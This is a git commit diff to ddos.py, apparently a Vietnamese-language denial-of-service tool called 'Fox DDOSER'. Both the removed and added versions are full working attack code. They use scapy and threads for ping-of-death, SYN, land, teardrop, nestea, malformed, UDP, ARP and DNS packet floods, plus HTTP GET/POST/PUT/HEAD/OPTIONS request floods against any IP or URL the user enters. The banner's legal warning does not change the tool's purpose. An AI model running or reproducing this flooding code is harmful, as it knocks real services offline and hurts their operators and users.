8c80629e8a7db677ca4a0a29329045fe3ead82a0
dhungx <139793488+dhungx@users.noreply.github.com>
2024-08-11 14:08:08 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,289 +1,234 @@
-# -*- coding: utf-8 -*-
 from scapy.all import *
 import socket
 import threading
 import random
 import pyuseragents
 import requests
-from rainbowtext import text as mauxanh
+from rainbowtext import text as rain
 import pyfiglet
 import colorama
 
-# Thiết lập màu sắc
-do = colorama.Fore.RED
-trang = colorama.Fore.WHITE
-xanh = colorama.Fore.BLUE
-luc = colorama.Fore.GREEN
-vang = colorama.Fore.YELLOW
-hong = colorama.Fore.MAGENTA
-lam = colorama.Fore.CYAN
-xanhluc = colorama.Fore.LIGHTGREEN_EX
+# Khởi tạo màu sắc
+colorama.init()
+rd = colorama.Fore.RED
+cv = colorama.Fore.WHITE
+bl = colorama.Fore.BLUE
+gn = colorama.Fore.GREEN
+yl = colorama.Fore.YELLOW
+mag = colorama.Fore.MAGENTA
+cy = colorama.Fore.CYAN
+lgn = colorama.Fore.LIGHTGREEN_EX
 
-# Hàm hiển thị tiêu đề
 def banner():
     figlet = pyfiglet.Figlet(font="script").renderText("Fox DDOSER")
     return figlet
 
-# Các hàm tấn công
-def tan_cong_ping_chet(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            send(IP(dst=url_muc_tieu, ttl=132, id=1111) / ICMP() / (b"Sdadad" * 8192), verbose=0)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_ping_chet: {e}")
+def ping_of_death(ip_target):
+    i = 0
+    while True:
+        send(IP(dst=ip_target, ttl=132, id=1111)/ICMP()/(b"Sdadad"*8192), verbose=0)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_syn(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            ip = IP(dst=url_muc_tieu, id=1111, ttl=99)
-            tcp = TCP(sport=RandShort(), dport=80, seq=12345, ack=1000, windows=1000, flags="S")
-            du_lieu = b"MRadikal" * 8192
-            send(ip / tcp / du_lieu, verbose=0)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_syn: {e}")
+def syn_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target, id=1111, ttl=99)
+        tcp = TCP(sport=RandShort(), dport=80, seq=12345, ack=1000, windows=1000, flags="S")
+        data = b"MRadikal" * 8192
+        send(ip / tcp / data, verbose=0)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_loi(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            ip = IP(dst=url_muc_tieu, ihl=2, version=3, ttl=52, id=112)
-            icmp = ICMP()
-            send(ip / icmp, verbose=0)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_loi: {e}")
+def malformed_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target, ihl=2, version=3, ttl=52, id=112)
+        icmp = ICMP()
+        send(ip / icmp, verbose=0)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_land(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            ip = IP(dst=url_muc_tieu, src=url_muc_tieu, id=78, ttl=92)
-            tcp = TCP(sport=135, dport=135)
-            send(ip / tcp, verbose=0)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_land: {e}")
+def land_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target, src=ip_target, id=78, ttl=92)
+        tcp = TCP(sport=135, dport=135)
+        send(ip / tcp, verbose=0)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_nestea(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            ip = IP(dst=url_muc_tieu, id=42, flags="MF")
-            du_lieu = b"ZZZZ" * 1024
-            send(ip / UDP() / du_lieu, verbose=0)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_nestea: {e}")
+def nestea_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target, id=42, flags="MF")
+        data = b"ZZZZ" * 1024
+        send(ip / UDP() / data, verbose=0)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_udp(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            ip = IP(dst=url_muc_tieu)
-            udp = fuzz(UDP())
-            send(ip / udp, verbose=0)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_udp: {e}")
+def udp_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target)
+        udp = fuzz(UDP())
+        send(ip / udp, verbose=0)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_arp(url_muc_tieu):
-    try:
-        ether = Ether(dst="FF:FF:FF:FF:FF:FF")
-        arp = ARP(psrc=RandIP(), pdst=url_muc_tieu)
-        srpflood(ether / arp)
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_arp: {e}")
+def arp_attack(ip_target):
+    ether = Ether(dst="FF:FF:FF:FF:FF:FF")
+    arp = ARP(psrc=RandIP(), pdst=ip_target)
+    srp(ether / arp)
 
-def tan_cong_teardrop(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            ip = IP(dst=url_muc_tieu, flags=0, proto=17, frags=3)
-            du_lieu = ("\x00" * 100)
-            ips = IP(dst=url_muc_tieu, flags="MF", proto=17, frag=18)
-            send(ip / du_lieu, verbose=0)
-            send(ips / du_lieu, verbose=0)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 2
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_teardrop: {e}")
+def teardrop_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target, flags=0, proto=17, frag=3)
+        data = b"\x00" * 100
+        ips = IP(dst=ip_target, flags="MF", proto=17, frag=18)
+        send(ip / data, verbose=0)
+        send(ips / data, verbose=0)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 2
 
-def tan_cong_dns(url_muc_tieu):
-    try:
-        i = 0
-        while True:
-            ip = IP(dst=url_muc_tieu, ttl=12)
-            udp = UDP(sport=RandShort(), dport=53)
-            dns = DNS(qd=DNSQR(qname="secdev.org", qtype="A"))
-            send(ip / udp / dns)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_dns: {e}")
+def dns_spoofing(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target, ttl=12)
+        udp = UDP(sport=RandShort(), dport=53)
+        dns = DNS(qd=DNSQR(qname="secdev.org", qtype="A"))
+        send(ip / udp / dns)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_tcp(url_muc_tieu):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        da_gui = 0
-        cang = 80
-        while True:
-            bytes = random._urandom(1769)
-            sock.sendto(bytes, (url_muc_tieu, cang))
-            da_gui += 1
-            cang += 1
-            print("Đã gửi %s gói đến %s qua cổng: %s" % (da_gui, url_muc_tieu, cang), end="\r")
-            if cang == 65534:
-                cang = 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_tcp: {e}")
+def tcp_attack(ip_target):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sent = 0
+    port = 80
+    while True:
+        bytes = random._urandom(1769)
+        sock.sendto(bytes, (ip_target, port))
+        sent += 1
+        port += 1
+        print(f"Gửi {sent} gói tin đến {ip_target} trên cổng: {port}", end="\r")
+        if port == 65534:
+            port = 1
 
-def tan_cong_GET(url_muc_tieu):
-    try:
-        useragent = pyuseragents.random()
-        header = {"User-Agent": useragent}
-        i = 0
-        while True:
-            requests.get(url_muc_tieu, headers=header)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_GET: {e}")
+def GET_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent": useragent}
+    i = 0
+    while True:
+        requests.get(url_target, headers=header)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_POST(url_muc_tieu):
-    try:
-        useragent = pyuseragents.random()
-        header = {"User-Agent": useragent}
-        i = 0
-        while True:
-            requests.post(url_muc_tieu, headers=header)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_POST: {e}")
+def POST_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent": useragent}
+    i = 0
+    while True:
+        requests.post(url_target, headers=header)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_HEAD(url_muc_tieu):
-    try:
-        useragent = pyuseragents.random()
-        header = {"User-Agent": useragent}
-        i = 0
-        while True:
-            requests.head(url_muc_tieu, headers=header)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_HEAD: {e}")
+def HEAD_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent": useragent}
+    i = 0
+    while True:
+        requests.head(url_target, headers=header)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_PUT(url_muc_tieu):
-    try:
-        useragent = pyuseragents.random()
-        header = {"User-Agent": useragent}
-        i = 0
-        while True:
-            requests.put(url_muc_tieu, headers=header)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_PUT: {e}")
+def PUT_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent": useragent}
+    i = 0
+    while True:
+        requests.put(url_target, headers=header)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-def tan_cong_OPTIONS(url_muc_tieu):
-    try:
-        useragent = pyuseragents.random()
-        header = {"User-Agent": useragent}
-        i = 0
-        while True:
-            requests.options(url_muc_tieu, headers=header)
-            print("Đã gửi: %s\n" % str(i), end="\r")
-            i += 1
-    except Exception as e:
-        print(f"Lỗi trong tan_cong_OPTIONS: {e}")
+def OPTIONS_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent": useragent}
+    i = 0
+    while True:
+        requests.options(url_target, headers=header)
+        print(f"Gửi : {i}\n", end="\r")
+        i += 1
 
-# Chương trình chính
-print(mauxanh(banner()))
-print(mauxanh("""
+print(rain(banner()))
+print(rain("""
 |==============================|
 |         Black Fox            |
 |       ViBoss Team.           |
-|  Tác giả : ViBoss Studio.    |
-|    DDOSER Tầng 4, Tầng 7     |
+|  Author : ViBoss Studio.     |
+|    DDOSER Layer 4 , Layer 7  |
 |==============================|
 
-ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC) HOẶC CÁC MỤC TIÊU KHÁC CÓ HẬU QUẢ PHÁP LÝ!
-CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP HOẶC TEST BẢO MẬT CHO CHÍNH BẠN.
+ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC).
+
+HÃY CÂN NHẮC VÀ CẨN THẬN KHI SỬ DỤNG VÌ VIỆC BẠN SẮP LÀM CÓ THỂ LÀ ĐIỀU PHẠM PHÁP
 """))
 
-phuong_thuc = input(f"{xanh} Nhập phương thức (ping_chet, syn, lỗi, land, nestea, udp, arp, teardrop, dns, tcp, get, post, head, put, options): ").strip()
-url_muc_tieu = input(f"{xanh} Nhập URL hoặc IP mục tiêu: ").strip()
-so_luong_socket = int(input(f"{luc} Nhập số lượng socket (mặc định là 100): ") or "100")
+layer = input(cy + "[-] Chọn lớp tấn công:\n[-] layer4: Tấn công lớp 4\n[-] layer7: Tấn công lớp 7\n\n ~ Chọn lớp để tiếp tục -> ")
 
-if phuong_thuc == "ping_chet":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_ping_chet, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "syn":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_syn, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "lỗi":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_loi, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "land":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_land, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "nestea":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_nestea, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "udp":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_udp, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "arp":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_arp, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "teardrop":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_teardrop, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "dns":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_dns, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "tcp":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_tcp, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "get":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_GET, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "post":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_POST, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "head":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_HEAD, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "put":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_PUT, args=(url_muc_tieu,)).start()
-
-elif phuong_thuc == "options":
-    for _ in range(so_luong_socket):
-        threading.Thread(target=tan_cong_OPTIONS, args=(url_muc_tieu,)).start()
-
+if layer == "layer4":
+    ip_target = input(rd + "Nhập IP mục tiêu - > ")
+    socketx = int(input(yl + "Nhập số lượng luồng (ví dụ: 10) - > "))
+    method = input(gn + "[^] ping_of_death\n[^] syn\n[^] malformed\n[^] land\n[^] arp\n[^] nestea\n[^] dns_spoofing\n[^] teardrop\n[^] udp\n[^] tcp\n\n[~] Nhập phương thức: ")
+    if method == "ping_of_death":
+        for i in range(socketx):
+            threading.Thread(target=ping_of_death, args=(ip_target,)).start()
+    elif method == "syn":
+        for i in range(socketx):
+            threading.Thread(target=syn_attack, args=(ip_target,)).start()
+    elif method == "malformed":
+        for i in range(socketx):
+            threading.Thread(target=malformed_attack, args=(ip_target,)).start()
+    elif method == "land":
+        for i in range(socketx):
+            threading.Thread(target=land_attack, args=(ip_target,)).start()
+    elif method == "arp":
+        print("Bắt đầu tấn công ARP ngay lập tức .... !")
+        for i in range(socketx):
+            threading.Thread(target=arp_attack, args=(ip_target,)).start()
+    elif method == "nestea":
+        for i in range(socketx):
+            threading.Thread(target=nestea_attack, args=(ip_target,)).start()
+    elif method == "dns_spoofing":
+        for i in range(socketx):
+            threading.Thread(target=dns_spoofing, args=(ip_target,)).start()
+    elif method == "teardrop":
+        for i in range(socketx):
+            threading.Thread(target=teardrop_attack, args=(ip_target,)).start()
+    elif method == "udp":
+        for i in range(socketx):
+            threading.Thread(target=udp_attack, args=(ip_target,)).start()
+    elif method == "tcp":
+        for i in range(socketx):
+            threading.Thread(target=tcp_attack, args=(ip_target,)).start()
+elif layer == "layer7":
+    url_target = input(bl + "Nhập URL mục tiêu: ")
+    worker = int(input(mag + "Nhập số lượng luồng: "))
+    method = input(lgn + "[$] GET\n[$] POST\n[$] PUT\n[$] HEAD\n[$] OPTIONS\n\n[*] Nhập phương thức: ")
+    if method == "GET":
+        for x in range(worker):
+            threading.Thread(target=GET_attack, args=(url_target,)).start()
+    elif method == "POST":
+        for x in range(worker):
+            threading.Thread(target=POST_attack, args=(url_target,)).start()
+    elif method == "PUT":
+        for x in range(worker):
+            threading.Thread(target=PUT_attack, args=(url_target,)).start()
+    elif method == "HEAD":
+        for x in range(worker):
+            threading.Thread(target=HEAD_attack, args=(url_target,)).start()
+    elif method == "OPTIONS":
+        for x in range(worker):
+            threading.Thread(target=OPTIONS_attack, args=(url_target,)).start()
 else:
-    print(f"{do} Phương thức tấn công không hợp lệ!")
+    print("Lớp tấn công không hợp lệ. Vui lòng chọn lại.")
